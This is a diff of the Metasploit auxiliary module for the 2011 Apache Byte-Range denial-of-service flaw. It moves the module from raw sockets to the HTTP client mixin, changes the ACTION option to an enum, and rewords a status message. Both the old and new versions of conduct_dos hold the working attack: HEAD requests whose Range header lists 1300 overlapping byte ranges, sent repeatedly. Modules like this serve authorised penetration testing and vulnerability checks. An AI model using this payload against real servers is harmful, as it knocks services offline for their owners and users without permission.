@@ -13,7 +13,6 @@ require 'msf/core'
 
 class Metasploit3 < Msf::Auxiliary
 
-	include Msf::Exploit::Remote::Tcp
 	include Msf::Exploit::Remote::HttpClient
 	include Msf::Auxiliary::WmapScanFile
 	include Msf::Auxiliary::Scanner
@@ -45,14 +44,6 @@ class Metasploit3 < Msf::Auxiliary
 					[ 'OSVDB', '74721' ],
 				],
 			'DisclosureDate' => 'Aug 19 2011',
-
-		'Actions'  =>
-			[
-				['DOS'],
-				['CHECK']
-			],
-		'DefaultAction' => 'DOS'
-
 		))
 
 		register_options(
@@ -60,20 +51,20 @@ class Metasploit3 < Msf::Auxiliary
 				Opt::RPORT(80),
 				OptString.new('URI', [ true,  "The request URI", '/']),
 				OptInt.new('RLIMIT', [ true,  "Number of requests to send",50]),
-				OptString.new('ACTION', [true, "DOS or CHECK", "DOS"])
+				OptEnum.new('ACTION', [true, "DOS or CHECK", "DOS",["DOS","CHECK"]])
 			], self.class)
 	end
 
 	def run_host(ip)
 
-	case action.name
+		case datastore['action'] 
 
-	when 'DOS'
-		conduct_dos()
+			when 'DOS'
+				conduct_dos()
 
-	when 'CHECK'
-		check_for_dos()
-	end
+			when 'CHECK'
+				check_for_dos()
+		end
 
 	end
 
@@ -94,14 +85,12 @@ class Metasploit3 < Msf::Auxiliary
 					:host   => rhost,
 					:port   => rport,
 					:data   => "Apache Byte-Range DOS at #{path}"
-
 				)
 
 				else
-					print_status("NADA")
-			
-				end
+					print_status("#{rhost} doesn't seem to be vulnerable at #{path}")
 
+				end
 
 			rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
 			rescue ::Timeout::Error, ::Errno::EPIPE
@@ -113,23 +102,19 @@ class Metasploit3 < Msf::Auxiliary
 
 	def conduct_dos()
 		uri = datastore['URI']
+		rhost = datastore['RHOST']
 		ranges = ''
 		for i in (0..1299) do
 			ranges += ",5-" + i.to_s
 		end
 		for x in 1..datastore['RLIMIT']
 			begin
-				connect
 				print_status("Sending DoS packet #{x} to #{rhost}:#{rport}")
-
-				sploit = "HEAD " + uri + " HTTP/1.1\r\n"
-				sploit << "Host: " + rhost + "\r\n"
-				sploit << "Range: bytes=0-" + ranges + "\r\n"
-				sploit << "Accept-Encoding: gzip\r\n"
-				sploit << "Connection: close\r\n\r\n"
-
-				sock.put(sploit)
-				disconnect
+				res = send_request_cgi({
+										'uri'           =>  uri,
+										'method'		=> 'HEAD',
+										'headers'		=> { "HOST" => rhost,
+															"Range" => "bytes=0-#{ranges}"}},1)
 			rescue ::Rex::ConnectionRefused
 				print_status("Unable to connect to #{rhost}:#{rport}.")
 			rescue ::Errno::ECONNRESET
